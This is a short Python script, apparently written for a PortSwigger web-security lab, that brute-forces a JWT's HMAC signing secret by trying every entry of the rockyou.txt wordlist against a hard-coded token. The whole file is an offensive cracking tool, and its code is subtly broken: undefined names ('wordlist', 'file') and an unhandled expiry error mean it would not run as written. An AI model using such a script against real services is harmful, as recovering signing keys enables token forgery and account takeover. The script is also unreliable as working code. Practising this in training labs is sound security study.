import jwt

# Paste JWT token here
jwt_token = 'eyJraWQiOiJiYTliOWMwOS1jZjdjLTQ5YTAtOTU2Ny01MGU3NDFjNGVmMTQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NTM5MjgzMywic3ViIjoid2llbmVyIn0.s0KS1-LbgWUH5FL2yXmUOtBR1vmZoNGlRxtbYFuBzwk'
wordlist_file ='/usr/share/wordlists/rockyou.txt'

def attempt_fuzzing(secret_key,algorithm):
    try:
        decoded = jwt.decode(jwt_token,secret_key,algorithms=[algorithm])
        print(f"[+] Success! Found secret key: {secret_key}")
        print(f"Decoded token: {decoded}")
        return decoded
    except jwt.InvalidSignatureError:
        return False


def fuzz_Secret_ket(worldlist):
    header = jwt.get_unverified_header(jwt_token)
    algorithm = header['alg']
    if not algorithm:
        print("[-] Algorithm not found")
        return None
    else:
        print(f"[+] Algorithm found: {algorithm}")

    with open(wordlist,'r') as f:
        for line in file:
            secret_key = line.strip()
            if attempt_fuzzing(secret_key,algorithm):
                return secret_key
    return None


# Start fuzzing
found_key = fuzz_Secret_ket(wordlist_file)

if found_key:
    print(f"[+] Found secret key: {found_key}")
else:
    print("[-] Secret key not found")